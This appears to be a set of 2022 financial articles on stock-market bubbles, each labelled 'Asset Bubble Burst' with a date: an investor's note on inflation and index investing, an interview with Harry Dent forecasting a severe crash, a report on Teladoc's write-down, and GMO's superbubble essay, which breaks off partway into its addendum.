The annual inflation rate in January 2022 stood at 7.5%, beating consensus estimates of 7.3% as a result of soaring energy costs, labor shortages, and supply disruptions meeting high consumer demand. This marks the highest inflation rate since 1982. While inflation is expected to have peaked this month, it is likely to stay elevated throughout 2022 due to longer-than-expected supply chain disruptions and high energy prices. As a result of U.S. consumer prices rising at their fastest pace since the early 1980s, markets have been speculating a hefty 50-basis-point hike beginning in early March. Overall, the consensus of all major banks stands around 150 bps, although some estimate up to 175 bps throughout Fed's seven meetings in 2022. This will most certainly create an unfavorable environment for the stock market, particularly for growth stocks.

Finally, the Russia-Ukraine conflict continues to loom, which could send energy prices even higher in the case of an invasion. As a result, inflation will likely drop slower than expected, which would put additional pressure on the Federal Reserve to prevent a recession. Moreover, it could threaten international affairs, leading to sanctions, which likely would further hurt the stock market.

What now?

Certainly, I am in no position to tell any individual how to best manage their wealth. However, during times of high uncertainty, it is often best to utilize a balanced risk-based approach in investing. Theoretically, this should be the case in every market situation, although sometimes it may be reasonable to utilize less diversification in an investment portfolio (for example during the Covid-19 crash in 2020). The most recent crash in growth stocks has demonstrated that outperforming the benchmarks is nearly impossible over the long term and requires high levels of both luck and skill. Thus, indexes offer investors the most favorable risk-reward profile, especially over the long term.

In my opinion, a great alternative to the S&P 500 index is the MSCI World Index (URTH), which includes the largest companies from all over the world. If Grantham is indeed correct, then international stocks (from Europe and Japan) should outperform U.S stocks over the short to mid-term simply due to more favorable valuations. Here, the index offers a balanced portfolio and reduces individual risk as a result.

As always, the best advice remains to stay invested at all times and potentially rebuy stocks as they continue to drop in order to bring down the dollar-cost average. Personally, I remain cautious about many growth stocks due to the continuous high-inflationary environment and stretched valuations in many growth stocks. Nevertheless, it may not be a bad idea to invest at least a fraction into undervalued growth stocks such as Pinterest (PINS), Teladoc Health (TDOC) and Square (SQ) in case investors such as Cathie Wood are correct and innovation stocks are in fact way undervalued.

Investors may also be looking to buy cryptocurrencies, which have also dropped in recent months. However, it has been surprising that cryptocurrencies have fallen relatively little compared to their overall volatility profile. In early 2018, Ethereum dropped from nearly $1200 USD to just under $70 USD in a matter of less than one year. That has been a loss of almost 94%; in comparison, Ether is now down 'only' 42% from all-time highs. Taking into account a high-inflationary environment and upcoming rate hikes, I find it difficult to imagine that Ether (and other cryptos) will reach all-time highs again in the near future. Thus, I would rather be interested in buying growth stocks than cryptocurrencies, but that's a personal take.

Nevertheless, for long-term passive index investors, the story does not change meaningfully. After all, economic development in emerging markets translates into plenty of growth opportunities for U.S companies (and other nations), which will likely lead to a recovery of the benchmarks in the future.",Asset Bubble Burst,2022-02-22 08:00:00

They’re printing more and more to keep this bubble going.
In a bubble crash like this, we expect the S&P, the Dow and Nasdaq to be down 80%-90%.","Here’s advice for financial advisors from “The Contrarian’s Contrarian,” Harry Dent Jr.:

In the unprecedented market crash that he foresees to hit this year, which will send stocks plummeting as much as 90%, refrain from routinely telling clients to stay the course and rebalance.

“That won’t work. The market is just going to keep going down. Richer people are going to lose the most. People will lose money, and … financial advisors are going to need bodyguards to keep their clients from shooting them,” Dent tells ThinkAdvisor in an interview.

The strategist and newsletter publisher has been predicting a humongous wide-reaching global crash for some time now.

Indeed, we’ve been in “a first crash” for the last two months, he argues. By the end of March, the market could be down “30%-40% or more,” he says.

That would mean that “the greatest bubble of all financial asset classes,” including gold, has burst, insists Dent.

But wait — midyear is when “the fireworks” really kick off, igniting “the biggest crash in a lifetime,” he predicts. Stocks will dive as much as 90%.

The U.S. economy has already lost its mojo, Dent maintains. He says a recession has just begun.

“It’s a necessary evil,” he notes, contending that recessions are a good thing — “a deep cleansing” that “clears the decks for the next boom.”

Dent is nothing if not controversial when it comes to his forecasts, which are largely based on demographics.

He correctly predicted Japan’s 1989 bubble bust and recession, the dotcom crash and the populist wave that brought Donald Trump his U.S. presidency.

Other of Dent’s prognostications, however, haven’t materialized; and his critics refuse to overlook that.

Dent, who has an MBA from Harvard Business School, owns HSD Publishing, an independent research firm that puts out monthly newsletters that he and Rodney Johnson, the firm’s president, each write.

A free daily newsletter is also made available.

In the interview, Dent predicts just when the stock market will bottom, when inflation will be tamed, how the dollar and gold will fare and what advisors should be telling clients to prepare for the big slide he forecasts.

A crypto enthusiast, he predicts that “Bitcoin is probably going to become the new monetary gold standard of the world.” Then he reveals his buying plans.

ThinkAdvisor held a phone interview with Dent, speaking from his base in San Juan, Puerto Rico, on March 8.

In his advice to advisors, he raised the issue of a retirement planning trend that disturbs him and indicated how FAs can effectively turn it around, if not eliminate it.

Here are highlights of our conversation:

THINKADVISOR: Will [Russian president Vladimir] Putin’s war against Ukraine cause the huge market crash that you’ve been predicting?

HARRY DENT JR.: Putin is just a trigger. So is inflation. They’re only symptoms. The cause will be the biggest bubble in history, and bubbles do only one thing: Burst.

The biggest issue is that we have the greatest stock market and financial asset bubbles in everything that people invest in, including gold.

But what effect will Russia’s invasion of Ukraine have on the market?

Putin’s [war] will end up revealing the weakness in the market if it ends up being a 30% to 50% crash near-term instead of a 10%-20% correction that happens fairly often.

Talk more about a near-term crash. When could that happen?

We’re just two months into this first crash now. Probably by the end of March, we could be down about 30% or 40% or more.

That would say to me that the bubble has burst.

The U.S. government created this damn bubble just to keep from having a few recessions and politicians taking a little blow here and there.

When is the huge, longer-term crash coming, then?

Maybe April into June. By midyear, the fireworks ought to go off on the downside. If not, I’m just going to have to shut up.

How bad will that crash be?

It will be the biggest crash in our lifetime. Stocks will go down 89%-90%. It will be global. Stocks and financial assets — particularly real estate — won’t come back next year, not in two years, not in five years — not for decades.

This is a different thing from the corrections we’ve had in the boom.

How will the crash impact the U.S. economy?

You’ll see about half of financial assets go down: Stocks will go down the most, then risky bonds, real estate, then less risky bonds and so on.

When people lose assets, they certainly slow their spending because they get more cautious.

When you’ve lost that much in assets, and people who have, for example, $600,000 saved up for retirement are getting close to that age, they say, “Holy crap, I’d better cut back. Forget that boat I was thinking of buying!”

Do you see a recession coming?

It has started right about now. March and April are moving into a recession. You have to allow recessions to clean up the messes.

[The government] is killing free-market capitalism because they don’t want to have a recession and clean out bad debts. They’ve been printing money for 13 years.

But the economy died between 2008 and now. You need to bury it and get on.

There are more zombie companies than ever because we didn’t let ourselves have a damn recession. They printed more money in just [the last] two years than in the 12 years before that!

They’re printing more and more to keep this bubble going. They’re printing more money to keep the economy growing not at 4% or 5%, but at [only] 2% on average!

The government created the biggest financial asset bubble of all asset classes, even gold.

Most people dread recessions. Why is it good to have them?

Recessions clean out the economy very effectively and efficiently so you can clear the decks to have a new boom.

You can’t have a boom without a bust. A recession is a deep cleansing. Cleansings are good. Recessions are the opposite of booms, and they are equally necessary.

This is a necessary evil. It will be painful; but if we don’t go through this permanent reset of the greatest financial bubble in history and back to normal, companies will have to fail and debts will have to fail.

What then?

The millennials will inherit this endless debt and never see an economy that’s growing at 3% or 4% again.

When will the stock market bottom out?

Likely in 2023, early 2024. In a bubble crash like this, we expect the S&P, the Dow and Nasdaq to be down 80%-90%.

It should take about two years, maybe more, when it’s time to buy. But we won’t come out of it as strong as we did in past major downturns because the millennial generation isn’t that strong.

It’s not as powerful a wave as the baby boomers, and it won’t last as long.",Asset Bubble Burst,2022-03-11 08:00:00

Health care was a marquee trade of the pandemic market.
The most recent comparison isn't the dotcom bubble.
But in an earlier era, it took Amazon a full decade to recover in share price after the dotcom bubble burst.","The AOL-Time Warner write-downs were multiple magnitudes the size of Teladoc (before and after its crash). But the collateral damage from the Teladoc disaster reaches across the recent disruptive investment era and one of its star stock pickers: ARK Invest's Cathie Wood, who was among the only funds that invested in the ""falling knife"" of Teladoc earlier this year, and had grown to be its largest shareholder. It was the third largest holding in her biggest fund after Tesla and another stay-at-home play: Zoom Video Communications.

CNBC's Bob Pisani pointed to an ominous market parallel: AOL-Time Warner. Within a year of that deal, the combined company's biggest headlines weren't about synergies but about ""goodwill impairments"" as the value of the original dotcom bubble deal milestone, AOL, plummeted.

To put into perspective how bad the $6.6 billion impairment charge is: after Thursday's stock decline, it was larger than Teladoc's market cap.

The $6.6 billion impairment charge is excluded from earnings metrics, but it is a big hit that relates directly to how Teladoc planned to make its stay-at-home trade bridge to a post-pandemic business. Teladoc bought Livongo for $18.5 billion in cash and stock in late 2020 in the biggest digital health deal to date.

This theme is now looking tenuous, and business models these disruptors plan to use to turn pandemic plays into long-term health-care winners less certain. Much of technology has been pummeled since last fall, from enterprise cloud to biotech and fintech, but this week's disastrous earnings from telehealth leader Teladoc marked the lowest point for the health-care version of this recent tech bubble trade. After booking a more than $6 billion charge related to its acquisition of chronic care company Livongo, Teladoc shares cratered and are now down more than 80% from a year ago. Its 40% dive on Thursday brought into stark relief what's been a yearlong train wreck for the digital health public valuations: competitors AmWell and 1Life Healthcare down more than 80% in the past year, and consumer health care company Him and Hers Health down more than 60%.

Health care was a marquee trade of the pandemic market. This may seem obvious: a world reckoning with a global medical crisis bringing economies to a standstill should awaken to the need for more health-care investment. There were big winners whose business was directly tied to the risk of pandemic, and whose investors proved the value of their forethought: namely, Moderna Therapeutics. But at a broader stock market level, the digital health trade was in the category of stay-at-home stocks that booked huge gains, as telehealth boomed, with patients required to seek care virtually and as the adoption of digital services across sectors went through years of evolution in a period of months.

This week's earnings details have included some big-name reckonings with the value of high-growth, high-tech — and high-risk — companies. Ford and Amazon writing down stakes in electric vehicle maker Rivian; Alphabet and Microsoft noting some equity bets that declined in value . But the valuation hit that was the biggest, and in it own microcosmic way, may speak loudest about the past decade of valuation gains in technology start-ups that has drawn comparison to the dotcom bubble, comes from the health-care sector.

Wood's fund is undeterred, buying more Teladoc on Thursday, and the stock had a bit of a bounce on Friday morning even as other tech stocks continued to sell off. But in a sign of just how much has come off the disruptive trading theme, her flagship ARK Innovation Fund has now suffered a fate familiar to the vast majority of investment management peers, even those that get off to a hot start: it is no longer ahead of the S&P 500 in performance since its inception. For any investor who lived through the dotcom bubble and is old enough, or had parents old enough, to be sold on the need to branch out from core equity into sector fund bets on health sciences, telecom and tech funds, the lessons should have been learned long ago.

The big issue for Teladoc isn't merely whether it and Livongo and others are merely in for a period of reset valuations before moving higher again, but whether cracks in the foundation of its business model have been exposed as the pandemic euphoria erodes. Wall Street, which bailed on the stock on Thursday morning, is concerned, with one analyst writing about the ""cracks in TDOC's whole health foundation as increased competitive intensity is weighing on growth and margins.""

And Wall Street notes those cracks are occurring in just the areas where Teladoc was planning to grow beyond the commoditized core telehealth service, into direct-to-consumer mental health and Livongo's chronic care space, expected growth drivers for the next three years.

""While we are reticent to make sweeping changes to our thesis based off of one poor quarter, we are doubtful that we will see the competition-driven headwinds abate anytime soon,"" one analyst who downgraded the stock wrote.

A focus by employers on wellness was viewed as a tailwind for this sector, but there are now growing doubts about just how much corporate buyers will pay for these services. Sales cycles are getting pushed out and employers paying very high wages and dealing with workforce shortages are reassessing their expenses. ""HR departments are getting squeezed because there's so much going on with respect to return to office, dealing with the Great Resignation and all of the hiring and allocating resources to talent acquisition and retention,"" Teladoc CEO CEO Jason Gorevic said.

The write-downs in Rivian stakes this week speak to what seemed logical enough in bubble talk after investors piled into the EV stock. Valuation gains often reflect one element of what makes a bubble: an imbalance between the supply of a particular investment desire and demand, and market bubbles form when too much money is put to work in a particular area that is short on supply. Rivian was one of the only public market options to bet on EVs other than Tesla.

But in digital health-care, it's the players and not just the trade that has gotten crowded, a point Teladoc alluded to in its earnings. ""We're seeing clients inundated with a number of new smaller point solutions, which has created noise in the marketplace,"" Gorevic said.

This is why companies like Teladoc had been actively seeking to scale up, and across services, in M&A like the Livongo deal. Castlight Health merged with Vera Whole Health. Virgin Pulse tied up with Welltok. Accolade bought PlushCare. Grand Rounds and Doctors on Demand merged. They also face the monster threat of Amazon, which this year began rolling out its health service to corporate plans nationally. Highly valued digital health companies tying up may have led to valuations getting well ahead of the proof the deals will work in a market being pressured on all sides.

The most recent comparison isn't the dotcom bubble. The Nasdaq is having its worst month since the March 2020 pandemic crash. Amazon took its biggest fall in eight years on Friday.

""The current market performance is threatening to make a transition from a longish and painful 'correction' to something more troubling,"" according to a note from Marketfield Asset Management Chairman Michael Shaoul cited by CNBC. ""What tends to be more important than price declines, is the length of time that it takes to repair a deep drawdown.""

Amazon falling more than 10% on Friday is nothing in the bigger picture of the trillion-dollar company it has become. But in an earlier era, it took Amazon a full decade to recover in share price after the dotcom bubble burst.

It could just be the pandemic trade bubble bottom being reached, or something deeper — with the Nasdaq on pace for its worst month not only since March 2020 but since 2008, and worst start to a year ever, worse than 2001 and 2002, according to Bespoke.

In a CNBC interview on Friday afternoon, Cathie Wood compared Teladoc to Amazon directly, saying they are in the ""same league"" and arguing that investors are missing out.

Gorevic told Wall Street analysts that he is convinced that Teladoc's ""whole-person"" strategy is the right one, and it may just take longer to see the pipeline turn into sales, and more deals may come through insurance partners rather than direct corporate buys. Teladoc is, no doubt, a leader in its market.

But Teladoc's CEO also conceded, ""it's still sort of on the verge of being finished with the integration, we don't have the proof points behind it. So people are waiting and anxious to see and the early adopters are buying, but we haven't yet hit the bulk of the market.""

Or in other words, the test results are not back in from the lab yet. Investors, unlike patients, don't need to wait.

(Approaching the End of) The First U.S. Bubble Extravaganza: Housing, Equities, Bonds, and Commodities

Executive Summary

All 2-sigma equity bubbles in developed countries have broken back to trend. But before they did, a handful went on to become superbubbles of 3-sigma or greater: in the U.S. in 1929 and 2000 and in Japan in 1989. There were also superbubbles in housing in the U.S. in 2006 and Japan in 1989. All five of these superbubbles corrected all the way back to trend with much greater and longer pain than average.

Today in the U.S. we are in the fourth superbubble of the last hundred years.

Previous equity superbubbles had a series of distinct features that individually are rare and collectively are unique to these events. In each case, these shared characteristics have already occurred in this cycle. The checklist for a superbubble running through its phases is now complete and the wild rumpus can begin at any time.

Introduction

In a bubble, no one wants to hear the bear case. It is the worst kind of party-pooping. For bubbles, especially superbubbles where we are now, are often the most exhilarating financial experiences of a lifetime. I participated in a wonderful micro-cap fireworks display from 1968 to 1969, in which I made a small fortune (7 times the then full cost of a year at business school).

My main stock, American Raceways, tripled while I was on vacation – $7 to $21 – then went to $100 by Christmas, only to lose it all even quicker by the following June, as almost all the fireworks exploded and crashed. This taught me a lesson, and it helped make me cautious.

The experience also makes it easy for me to sympathize with the view that bearish advice in bubbles always comes from old fogeys who “just don’t get it,” because I received that old fogey advice back then and just didn’t listen. I doubt speculators in the current bubble will listen to me now; but giving this advice is my job and possibly the right thing to do. So, once more unto the breach, dear friends.

This time last year it looked like we might have a standard bubble with resulting standard pain for the economy. But during the year, the bubble advanced to the category of superbubble, one of only three in modern times in U.S. equities, and the potential pain has increased accordingly.

Even more dangerously for all of us, the equity bubble, which last year was already accompanied by extreme low interest rates and high bond prices, has now been joined by a bubble in housing and an incipient bubble in commodities.

One of the main reasons I deplore superbubbles – and resent the Fed and other financial authorities for allowing and facilitating them – is the underrecognized damage that bubbles cause as they deflate and mark down our wealth.

As bubbles form, they give us a ludicrously overstated view of our real wealth, which encourages us to spend accordingly. Then, as bubbles break, they crush most of those dreams and accelerate the negative economic forces on the way down. To allow bubbles, let alone help them along, is simply bad economic policy.

What nobody seems to discuss is that higher-priced assets are simply worse than lower-priced ones. When farms or commercial forests, for example, double in price so that yields fall from 6% to 3% (as they actually have) you feel richer.

But your wealth compounds much more slowly at bubble pricing, and your income also falls behind. Some deal! And if you’re young, waiting to buy your first house or your first portfolio, it is too expensive to get even started. You can only envy your parents and feel badly treated, which you have been.

And then there is the terrible increase in inequality that goes with higher prices of assets, which many simply do not own, and “many” applies these days up to the median family or beyond.

They have been let down, know it, and increasingly (and understandably) resent it. And it absolutely hurts our economy. Looking back in a decade or two, if bad things have happened to our democracy, the huge surge in income and wealth inequality of the last 50 years (as CEO income moved from about 25x the average worker’s to about 250x) will have carried the largest share of the blame. So, a pox on asset bubbles!

Today – nerd alert – I will cover more of the definitions, the statistics, the history, and the technical details of superbubbles. The bottom line is that in general the bubbles in multiple assets, not just equities, have continued to inflate and therefore the potential pain from a break has increased. As usually happens, the equity bubble begins to deflate from the riskiest end of the market first – as it has been doing since last February. So, good luck! We’ll all need it.

Summary

All 2-sigma equity bubbles in developed countries have broken back to trend. But before they did, a handful went on to become superbubbles of 3-sigma or greater: in the U.S. in 1929 and 2000 and in Japan in 1989.

There were also superbubbles in housing in the U.S. in 2006 and Japan in 1989. All five of these superbubbles corrected all the way back to trend with much greater and longer pain than average.

Today in the U.S. we are in the fourth superbubble of the last hundred years.

Previous equity superbubbles had a series of distinct features that individually are rare and collectively are unique to these events. In each case, these shared characteristics have already occurred in this cycle.

The penultimate feature of these superbubbles was an acceleration in the rate of price advance to two or three times the average speed of the full bull market. In this cycle, the acceleration occurred in 2020 and ended in February 2021, during which time the NASDAQ rose 58% measured from the end of 2019 (and an astonishing 105% from the Covid-19 low!).

The final feature of the great superbubbles has been a sustained narrowing of the market and unique underperformance of speculative stocks, many of which fall as the blue chip market rises. This occurred in 1929, in 2000, and it is occurring now.

A plausible reason for this effect would be that experienced professionals who know that the market is dangerously overpriced yet feel for commercial reasons they must keep dancing prefer at least to dance off the cliff with safer stocks. This is why at the end of the great bubbles it seems as if the confidence termites attack the most speculative and vulnerable first and work their way up, sometimes quite slowly, to the blue chips.

The most important and hardest to define quality of a late-stage bubble is in the touchy-feely characteristic of crazy investor behavior. But in the last two and a half years there can surely be no doubt that we have seen crazy investor behavior in spades – more even than in 2000 – especially in meme stocks and in EV-related stocks, in cryptocurrencies, and in NFTs.

This checklist for a superbubble running through its phases is now complete and the wild rumpus can begin at any time.

What is new this time, and only comparable to Japan in the 1980s, is the extraordinary danger of adding several bubbles together, as we see today with three and a half major asset classes bubbling simultaneously for the first time in history. When pessimism returns to markets, we face the largest potential markdown of perceived wealth in U.S. history.

The Definition of a Bubble and a Superbubble

We have defined investment bubbles at GMO for over 20 years now by a statistical measure of extremes – a 2-sigma deviation from trend. For a random, normally distributed series, like the sum of tosses of a fair coin, a 2-sigma event should occur once every 44 trials in each direction. This measure is arbitrary but seems quite reasonable.

In real life, though, humans are not efficient (in the economic sense) but are often quite irrational and can get carried away so that 2-sigma outliers occur more often than random – not every 44 years, but every 35 years. We studied the available data across all asset classes over financial history and found a total of more than 300 2-sigma moves.1

In developed equity markets, every single example of a 2-sigma equity bubble in the last 100 years has eventually fully deflated with the price moving all the way back to the trend that existed prior to the bubble forming.

But market extremes do not stop at 2-sigma. I define a superbubble as a 3-sigma event. That would occur in a world of tossing fair coins about once in every 100 events, but in real life appears to occur two or three times more frequently than that.

We humans do crazy very well indeed! Yet whether the bubble hits 2-sigma, 3-sigma, or even higher, it still falls all the way back to trend, incurring enormous asset value losses.

The key here is that two things are true: 1) the higher you go, the lower the expected future return; you can gorge on your cake now or enjoy it piece by piece into the distant future, but you can’t do both; and 2) the higher you go, the longer and greater the pain you will have to endure to get back to trend – in the current case to a trend value of about 2500 on the S&P 500, adjusted for the passage of time, from whatever high point the market might reach (currently at nearly 4700).

And so it was in the three great bubbles in U.S. assets – equities in 1929 and 2000, and housing in 2006. And so it was, in spades, in the Japanese stock and real estate markets in the late 1980s. All five of these greatest of all bubbles fell all the way back to trend.

The Dangers of Multiple Asset Bubbles at the Same Time

The Japanese case, in particular, made one thing pretty clear: while it is dangerous to have a bubble in equities – for the loss of value can cause a shock through the wealth effect that can get out of control, which was a part of the problem in 1929 and the ensuing slump – it is much more dangerous to have a bubble in housing, and it is very much more dangerous to have both together.

The economic consequences of the double bubble in Japan are arguably still playing out. Exhibit 1 shows that neither the equity market nor land have yet recovered their 1989 peaks!

Exhibit 1: Nikkei Index And Japanese City Commercial Real Estate, 1980-Today

But now, for the first time in the U.S. we have simultaneous bubbles across all major asset classes. To detail:

First, we are indeed participating in the broadest and most extreme global real estate bubble in history. Today houses in the U.S. are at the highest multiple of family income ever, after a record 20% gain last year, ahead even of the disastrous housing bubble of 2006.

But although the U.S. housing market is selling at a high multiple of family income, it is less, sometimes far less, than many other countries, e.g., Canada, Australia, the U.K., and especially China. (In China, real estate has played an unusually important and unique role in the extended boom and thereby poses an equally unique risk to the economy and hence the rest of the world if its real estate market loses air exactly as it appears to be doing as we sit.)

Second, we have the most exuberant, ecstatic, even crazy investor behavior in the history of the U.S. stock market. The U.S. market today has, in my opinion, the greatest buy-in ever to the idea that stocks only go up, which is surely the real essence of a bubble. (Interestingly, where other developed countries lead in housing prices, they lag the U.S. in equity prices. Some, such as Japan, by so much that they are merely slightly overpriced today.)

Third, as if this were not enough, we also have the highest-priced bond markets in the U.S. and most other countries around the world, and the lowest rates, of course, that go with them, that human history has ever seen.

And fourth, as gravy (as if we needed any) we have broadly overpriced, or above trend, commodities including oil and most of the important metals. In addition, the UN’s index of global food prices is around its all-time high (see Exhibit 2).

These high prices are important as they push inflation and stress real incomes. The combination, which we saw in 2008, of still-rising commodity prices with a deflating asset price bubble is the ultimate pincer attack on the economy and is all but guaranteed to lead to major economic pain.

Exhibit 2: UN FAO Food Price Index

What our financial leadership should know is that multiplying these risks – these three and a half bubbles – will multiply the total shock if the damage occurs simultaneously. And this package presents more potential for writing down perceived wealth than at any previous time in history.

We wrote in 2007 that deflating U.S. housing prices could directly lose $10 trillion or well over half a year’s GDP if house prices declined to moderately below trend – which they did.

But at that time the bond market was merely overpriced at the risky corporate end and the stock market merely normally overvalued. (The stock market still halved in price in sympathy, if you will, with the main event – housing and housing-related debt.)2

Yet despite that recent pain, all of the economic and financial dangers that are now building up from multiple major bubbles do not appear to be considered especially dangerous by the Fed or most of its equivalents around the world. In fact, the warning signs appear to be barely noticed at all.

How Did This Happen: Will the Fed Never Learn?

As of today, the U.S. has seen three great asset bubbles in 25 years, far more than normal. I believe this is far from being a run of bad luck, rather this is a direct outcome of the post-Volcker regime of dovish Fed bosses. It is a good time to ask why on Earth the Fed would not only have allowed these events but should have actually encouraged and facilitated them.

The fact is they did not “get” asset bubbles, nor do they appear to today. This avoidance of the issue seemed to us remarkable as long ago as the late 1990s. Alan Greenspan, who I considered then and now to be dangerously incompetent, famously acted as cheerleader in the formation of the then greatest equity bubble by far in U.S. history in the late 1990s and we all paid the price as it deflated.3

Bernanke should have been wiser from the experience of this bubble bursting and the ensuing pain, and he might have moved against the developing housing bubble – potentially more dangerous than an equity bubble as discussed. No such luck! It is pretty clear that Bernanke (and Yellen) were such believers in market efficiency that in their world bubbles could never occur.

This is old territory for me, but I have to admit to enjoying it. Back then, when confronted with a clear 3-sigma event in the U.S. housing market, Bernanke insisted that “the U.S. housing market merely reflects a strong U.S. economy,” and that “the U.S. housing market has never declined.” The information he meant to deliver was unsaid but clear: “and it never will decline because there is no bubble and never can be.”

On a purely statistical basis, the history of U.S. house prices had indeed never bubbled before, being so diversified collectively – booming in Florida while coasting in Chicago and falling in California. Until, that is, the sustained excess stimulation of the Greenspan and Bernanke era created a perfect opportunity to finally boom in every region together.

And what of the Fed’s statisticians? Picked for either their thick academic blinders or intimidated by the usual career risk we all know and love so well – don’t deliver information your boss doesn’t want to hear – they were totally silent or ineffective.

Whereupon the unprecedented and apparently non-existent housing bubble retreated all the way back to its trend that had existed prior to the bubble, and then quite typically for a bubble, went well below. So, the 3-sigma event came and went, the best looking, most well-behaved bubble of all time (see Exhibit 3), causing profound economic damage to the U.S. and global economies, particularly because of the lack of regulation around the new mortgage-related instruments.

Thus, the Fed had for the second time aided and abetted a great bubble forming. And this time the pain was augmented by the housing bust, associated mortgage mayhem, and the ensuing decline in the U.S. stock market – merely badly overpriced but not a bubble – with the combined loss of “perceived wealth” threatening a depression and necessitating an unprecedented bailout and massive, but rather inept, stimulus. Yet, when society looked around to assign blame and process lessons learned, it was as if it tried very hard to miss the point.

Exhibit 3: The U.S. Housing Bubble

Yes, Bernanke and Paulson did a perfectly fine job of lobbying Congress for help, etc., after the fact. But overall it was as if the Fed, at the wheel of a titanically-sized economy, had imprudently raced the economy through dangerous waters, ignoring the risks of icebergs so profoundly that the captain deserved a court martial but instead, after the boat sank, was rewarded for doing a serviceable job of helping women and children (and bankrupt bankers at Citi for that matter) into lifeboats.

Previously, Greenspan had even fought to help the boat speed up, by trying to bully Brooksley Born at the CFTC to not regulate the growing wave of dangerous subprime instruments. When she refused to back off from a job that was clearly hers, he then resorted to lobbying Congress to change the law to leave these new “demons of our own design”4 altogether unregulated.

In this infamous side job, he was joined by Arthur Levitt of the SEC (who apparently on this occasion saw “security” as a dirty word) and one of my favorite Teflon men, Larry Summers. What were they thinking with this reckless behavior? That bankers could regulate themselves?

The episode was remarkable in many ways as was our willingness to forget it. But what a good job it did in revealing where Greenspan’s heart really lay – in deregulation.

With the clear dangers of an equity bubble revealed in 2000 to 2002, the even greater dangers of a housing bubble in 2006 to 2010, and the extra risk of doing two asset bubbles together in Japan in the late 1980s and in the U.S. in 2007, what has the Fed learned?

Absolutely nothing, or so it would appear. In fact the only “lesson” that the economic establishment appears to have learned from the rubble of 2009 is that we didn’t address it with enough stimulus. That we should actually have taken precautions to avoid the crisis in the first place seems to be a lesson not learned, in fact not even taught.

So we settle for more lifeboats rather than iceberg avoidance. And we forgive and forget incompetence and fail to punish even outright malfeasance. (Iceland, pop 300,000, sent 26 bankers to prison; the U.S., pop 300,000,000, sent zero. Zero!)

Bubbles, Growth, and Inequality

Perhaps the most important longer-term negative of these three bubbles, compressed into 25 years, has been a sustained pressure increasing inequality: to participate in the upside of an asset bubble you need to own some assets and the poorer quarter of the public owns almost nothing.

The top 1%, in contrast, own more than one-third of all assets. And we can measure the rapid increase in inequality since 1997, which has left the U.S. as the least equal of all rich countries and, even more shockingly, with the lowest level of economic mobility, even worse than that of the U.K., at whom we used to laugh a few decades back for its social and economic rigidity.

This increase in inequality directly subtracts from broad-based consumption because, on the margin, rich people getting richer will spend little to nothing of the increment where the poorest quartile would spend almost all of it.

So, here we are again. This time with world record stimulus from the housing bust days, followed up by ineffably massive stimulus for Covid. (Some of it of course necessary – just how much to be revealed at a later date.)

But everything has consequences and the consequences this time may or may not include some intractable inflation. But it has already definitely included the most dangerous breadth of asset overpricing in financial history. At some future date, when pessimism rules again as it does from time to time, asset prices will decline.

And if valuations across all of these asset classes return even two-thirds of the way back to historical norms, total wealth losses will be on the order of $35 trillion in the U.S. alone.5 If this negative wealth and income effect is compounded by inflationary pressures from energy, food, and other shortages, we will have serious economic problems.

Some Last-Minute Color on Market Frenzy and Breadth

The penultimate phase of major bubbles has been characterized by a “blow-off” – an accelerating rate of stock price growth to two or three times the average of the preceding bull market. This pattern was shown as clearly as any of history’s other great superbubbles in 2020 (see Exhibit 4).

Exhibit 4: Stock Market Superbubbles Have Blow-Off Tops

As for speculative madness, there were already many fantastic bubble anecdotes from 2020, which I wrote about last year.6 Since then, the anecdotes have been even better. We’ve had:

The meme stock madness of GME and AMC – two companies in declining industries further decimated by Covid-19 – that managed to rally 120x and 38x, respectively, from their post-pandemic lows to their 2021 highs, driven by message board sentiment, taking GME briefly to 20% of the entire Russell 2000;

The Dogecoin (DOGE-USD) phase, in which a cryptocurrency conceived as a parody of the crypto craze went up nearly 300x, to a market cap of $90 billion because Elon Musk kept joking about it; and

La pièce de résistance: after Hertz (HTZ) (one of 2020’s meme stock stars) saw a quick stock surge from announcing it would purchase a fleet of Teslas, Avis rather plaintively said something like, “Hey dudes, we might buy electric cars too,” and tripled in a day!

But – as fits the final “narrowing market” phase of a great bubble – most of these events are now well in the past, and the last six months have seen a growing numbness to the euphoria (see Exhibit 5).

GME, AMC, Dogecoin, and more than one-third of all NASDAQ stocks are now all down more than 50% from their highs. Bitcoin (BTC-USD) is down over 40%, and my own unfortunate QuantumScape (QS), which 13 months ago was worth more than GM (1929 had many extreme speculations but nothing on this scale), is down from its December 2020 peak by 83%. Ouch!

The Death of the Vampire

In the meantime, we are in what I think of as the vampire phase of the bull market, where you throw everything you have at it: you stab it with Covid, you shoot it with the end of QE and the promise of higher rates, and you poison it with unexpected inflation – which has always killed P/E ratios before, but quite uniquely, not this time yet7 – and still the creature flies.

(Just as it staggered through the second half of 2007 as its mortgage and other financial wounds increased one by one.) Until, just as you’re beginning to think the thing is completely immortal, it finally, and perhaps a little anticlimactically, keels over and dies. The sooner the better for everyone.

What to Do as an Investor?

GMO has a detailed set of recommendations available that I agree with. A summary might be to avoid U.S. equities and emphasize the value stocks of emerging markets and several cheaper developed countries, most notably Japan.

Speaking personally, I also like some cash for flexibility, some resources for inflation protection, as well as a little gold and silver. (Cryptocurrencies leave me increasingly feeling like the boy watching the naked emperor passing in procession. So many significant people and institutions are admiring his incredible coat, which is so technically complicated and superior that normal people simply can’t comprehend it and must take it on trust. I would not. In such situations I have learned to prefer avoidance to trust.)

GMO’s model to explain P/E is dominated by two factors: inflation, which multiples hate, and profit margins, which they love. Since the data starts in 1925, inflation surges had always hurt multiples badly…until now. Currently, inflation is 100% ignored… for now.

Rules of The Bubble Reviewed (For Distracted Readers)

All 2-sigma equity bubbles in developed equity markets have burst - all the way back to trend. The U.S. reached the 2-sigma level in the summer of 2020. But some of them went to 3-sigma or more before they burst - producing longer and deeper pain. The U.S. reached 3-sigma in late 2021. Timing is uncertain and when you get to 3-sigma superbubbles, such as we have now, there are few examples. Yet they have all shown certain characteristics before they broke.

a. A speculative investor frenzy that generated stories for distant decades, which we have had for well over a year;

b. A penultimate blow-off phase where stock gains accelerate, as we had in 2020;

c. And the ultimate narrowing phase - unique to these few superbubbles - where a decreasing number of very large blue chips go up as riskier and more speculative stocks underperform or even decline, as they did in 1929 and 2000 and as they have done since February 2021.

If a, b, and c are accounted for, light the blue touchpaper8 and retire to a safe distance, praying for a paradigm shift.

Addendum

Making Money and Reducing Risk in an Equity Superbubble

Matt Kadnar | January 2022

Navigating the career risk associated with bubbles (especially superbubbles) has always been tricky and is one of the biggest failings in the investment management industry.9 We at GMO dedicate ourselves to trying to get the big picture calls right.

